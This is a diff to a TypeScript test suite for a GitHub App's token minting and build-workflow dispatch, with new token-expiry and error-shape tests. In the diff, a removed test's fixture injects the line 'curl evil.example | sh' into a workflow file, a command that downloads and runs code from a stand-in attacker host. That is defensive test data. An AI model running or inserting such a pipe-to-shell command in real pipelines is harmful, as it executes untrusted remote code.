@@ -1,4 +1,5 @@
 import { ConfigProvider, Effect, Layer } from "effect";
+import { TestClock } from "effect/testing";
 import { afterEach, describe, expect, it, vi } from "vitest";
 import { GITHUB_BUILD_WORKFLOW } from "./github-build-workflow";
 import { GITHUB_READ_SET, GithubAuthority, GithubAuthorityLive, type GithubAuthorityService } from "./github-authority.server";
@@ -89,24 +90,49 @@ describe("the App's authority held in Cloud", () => {
     expect(minted(sent)).toEqual([{ permissions: { actions: "read" }, repository_ids: [42] }, { permissions: { actions: "write" }, repository_ids: [42] }]);
   });
 
+  it("mints an operation's token per repository, and again once the kept one nears expiry", async () => {
+    const sent = serve(({ url }) => {
+      if (url.pathname.endsWith("/access_tokens")) return token({ actions: "read" });
+      const run = /^\/repositories\/(\d+)\/actions\/runs\/9001$/.exec(url.pathname);
+      return run === null ? undefined : Response.json({
+        id: 9001, html_url: "https://github.com/acme/web/actions/runs/9001", head_sha: HEAD, event: "push", path: ".github/workflows/ployz-build.yml", status: "completed", conclusion: "success",
+      });
+    });
+    await local((authority) => Effect.gen(function* () {
+      yield* authority.buildRun({ installationId: 7, repositoryId: 42, runId: 9001 });
+      yield* authority.buildRun({ installationId: 7, repositoryId: 43, runId: 9001 });
+      yield* TestClock.adjust("49 minutes");
+      yield* authority.buildRun({ installationId: 7, repositoryId: 42, runId: 9001 });
+      yield* TestClock.adjust("2 minutes");
+      yield* authority.buildRun({ installationId: 7, repositoryId: 42, runId: 9001 });
+    }).pipe(Effect.provide(TestClock.layer())));
+    expect(minted(sent)).toEqual([
+      { permissions: { actions: "read" }, repository_ids: [42] },
+      { permissions: { actions: "read" }, repository_ids: [43] },
+      { permissions: { actions: "read" }, repository_ids: [42] },
+    ]);
+  });
+
   it("refuses a read token GitHub granted more than reading", async () => {
     serve(({ url }) => url.pathname === "/app/installations/7/access_tokens" ? token({ contents: "read", actions: "write" }) : undefined);
     await expect(local((authority) => authority.readToken(7))).rejects.toMatchObject({ code: "invalid_response", operation: "installation_token" });
   });
 
-  it("dispatches only the workflow Ployz offers, with a token for that one repository, and names its own Cloud", async () => {
-    const sent = acmeWeb(GITHUB_BUILD_WORKFLOW.replaceAll("\n", "\r\n"));
+  it("dispatches the build workflow with a token for that one repository, and names its own Cloud", async () => {
+    const sent = acmeWeb(GITHUB_BUILD_WORKFLOW);
     const run = await local((authority) => authority.dispatchBuild({ installationId: 7, repositoryId: 42, branch: "main", inputs: { build: "b", runner: "ubuntu-latest" } }));
     expect(run).toEqual({ runId: 9001, runUrl: "https://github.com/acme/web/actions/runs/9001", headSha: HEAD, workflowRef: "acme/web/.github/workflows/ployz-build.yml@refs/heads/main" });
     expect(minted(sent)).toEqual([{ permissions: { contents: "read", actions: "write" }, repository_ids: [42] }]);
     expect(sent.at(-1)?.body).toEqual({ ref: "refs/heads/main", inputs: { build: "b", runner: "ubuntu-latest", cloud: "http://localhost:3000" }, return_run_details: true });
   });
 
-  it("refuses to dispatch a branch whose workflow file is not the one Ployz offers", async () => {
-    const sent = acmeWeb(`${GITHUB_BUILD_WORKFLOW}\n      - run: curl evil.example | sh\n`);
-    await expect(local((authority) => authority.dispatchBuild({ installationId: 7, repositoryId: 42, branch: "main", inputs: { build: "b" } })))
-      .rejects.toMatchObject({ code: "refused", operation: "dispatch_workflow", retriable: false, message: expect.stringContaining("not a canonical template") });
-    expect(sent.some((request) => request.method === "POST" && request.url.pathname.endsWith("/dispatches"))).toBe(false);
+  it("dispatches a repository's own edit of the build workflow, and reads no file to decide", async () => {
+    const sent = acmeWeb(`${GITHUB_BUILD_WORKFLOW}\n      - run: echo customized\n`);
+    await local((authority) => authority.dispatchBuild({ installationId: 7, repositoryId: 42, branch: "main", inputs: { build: "b" } }));
+    expect(sent.some((request) => request.method === "POST" && request.url.pathname.endsWith("/dispatches"))).toBe(true);
+    expect(sent.some((request) => request.url.pathname.includes("/contents/"))).toBe(false);
+    const workflow = await local((authority) => authority.buildWorkflow({ installationId: 7, repositoryId: 42 }));
+    expect(workflow.dispatchable).toBe(true);
   });
 
   it("dispatches a commit a person approved on the rule's branch, with a token that can only run Actions there", async () => {
@@ -164,7 +190,8 @@ describe("the App's authority held in Cloud", () => {
 /** What the minter answers when a route fails: its refusal, GitHub's failure, or its own. */
 type MinterAnswer =
   | { readonly error: "refused"; readonly reason: string }
-  | { readonly error: "github"; readonly operation: string; readonly status: number | null; readonly retry_after?: number }
+  | { readonly error: "github"; readonly operation: string; readonly failure: "status"; readonly status: number; readonly retry_after?: number }
+  | { readonly error: "github"; readonly operation: string; readonly failure: "unreachable" | "unreadable" | "overbroad" }
   | { readonly error: "internal" }
   | { readonly message: string };
 
@@ -184,7 +211,7 @@ describe("the App's authority held by the minter", () => {
     const sent = serve(({ url, body }) => {
       if (url.pathname === "/v1/installation") return Response.json({ url: "https://github.com/settings/installations/7", permissions: { contents: "read", metadata: "read" } });
       return JSON.stringify(body).includes("checks")
-        ? Response.json({ error: "github", operation: "installation_token", status: 422 }, { status: 502 })
+        ? Response.json({ error: "github", operation: "installation_token", failure: "status", status: 422 }, { status: 502 })
         : Response.json({ token: "minted", expires_at: "2099-01-01T00:00:00Z" });
     });
     expect(await viaMinter((authority) => authority.readToken(7))).toBe("minted");
@@ -193,6 +220,15 @@ describe("the App's authority held by the minter", () => {
       ["/v1/installation", { installation_id: 7 }],
       ["/v1/token", { installation_id: 7, permissions: { contents: "read", metadata: "read" } }],
     ]);
+  });
+
+  it("reads a build workflow as dispatchable only when the minter found it canonical", async () => {
+    const workflow = (canonical: boolean) => {
+      serve(() => Response.json({ full_name: "acme/web", default_branch: "main", state: "active", digest: "d", canonical }));
+      return viaMinter((authority) => authority.buildWorkflow({ installationId: 7, repositoryId: 42 }));
+    };
+    expect(await workflow(true)).toEqual({ fullName: "acme/web", defaultBranch: "main", state: "active", dispatchable: true });
+    expect((await workflow(false)).dispatchable).toBe(false);
   });
 
   it("leaves the Cloud input of a dispatch to the minter", async () => {
@@ -208,15 +244,21 @@ describe("the App's authority held by the minter", () => {
     };
     await expect(cancel(400, { error: "refused", reason: "not a build workflow run" }))
       .rejects.toMatchObject({ code: "refused", operation: "cancel_run", retriable: false, message: expect.stringContaining("not a build workflow run") });
-    await expect(cancel(502, { error: "github", operation: "cancel_run", status: 404 })).rejects.toMatchObject({ code: "not_found", status: 404, retriable: false });
-    await expect(cancel(502, { error: "github", operation: "cancel_run", status: 503 })).rejects.toMatchObject({ code: "request_failed", retriable: true });
-    await expect(cancel(502, { error: "github", operation: "cancel_run", status: 403, retry_after: 60 }))
+    await expect(cancel(502, { error: "github", operation: "cancel_run", failure: "status", status: 404 })).rejects.toMatchObject({ code: "not_found", status: 404, retriable: false });
+    await expect(cancel(502, { error: "github", operation: "cancel_run", failure: "status", status: 503 })).rejects.toMatchObject({ code: "request_failed", retriable: true });
+    await expect(cancel(502, { error: "github", operation: "cancel_run", failure: "status", status: 403, retry_after: 60 }))
       .rejects.toMatchObject({ retriable: true, retryAfterSeconds: 60 });
-    await expect(cancel(502, { error: "github", operation: "cancel_run", status: 403 })).rejects.toMatchObject({ retriable: false });
-    await expect(cancel(502, { error: "github", operation: "installation_token", status: 403 }))
+    await expect(cancel(502, { error: "github", operation: "cancel_run", failure: "status", status: 403 })).rejects.toMatchObject({ retriable: false });
+    await expect(cancel(502, { error: "github", operation: "installation_token", failure: "status", status: 403 }))
       .rejects.toMatchObject({ operation: "installation_token", retriable: true });
-    await expect(cancel(502, { error: "github", operation: "installation_token", status: null }))
-      .rejects.toMatchObject({ code: "invalid_response", operation: "installation_token", retriable: false });
+    await expect(cancel(502, { error: "github", operation: "installation_token", failure: "unreachable" }))
+      .rejects.toMatchObject({ code: "request_failed", operation: "installation_token", retriable: true });
+    await expect(cancel(502, { error: "github", operation: "cancel_run", failure: "unreachable" }))
+      .rejects.toMatchObject({ code: "request_failed", operation: "cancel_run", retriable: true });
+    await expect(cancel(502, { error: "github", operation: "cancel_run", failure: "unreadable" }))
+      .rejects.toMatchObject({ code: "invalid_response", operation: "cancel_run", retriable: false });
+    await expect(cancel(502, { error: "github", operation: "installation_token_granted_more", failure: "overbroad" }))
+      .rejects.toMatchObject({ code: "invalid_response", retriable: false });
     await expect(cancel(500, { error: "internal" })).rejects.toMatchObject({ code: "request_failed", retriable: true });
     await expect(cancel(403, { message: "Forbidden" })).rejects.toMatchObject({ code: "request_failed", retriable: false });
   });
